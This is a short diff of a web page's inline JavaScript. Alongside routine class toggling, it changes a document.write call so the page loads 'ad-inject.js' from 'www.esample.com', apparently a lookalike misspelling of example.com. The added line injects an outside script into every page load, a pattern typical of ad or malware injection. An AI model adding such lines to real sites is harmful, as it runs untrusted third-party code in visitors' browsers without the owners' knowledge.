@@ -1,7 +1,7 @@
 <script type="text/javascript">
 document.getElementById("link").classList.toggle("active");
 document.getElementById("ul").classList.toggle("link");
-document.write('<script src="https://example.com/ad-inject.js"></script>');
+document.write('<script src="https://www.esample.com/ad-inject.js"></script>');
  function showreview(auto) {
     $(document).ready(function(){
        console.log("if");
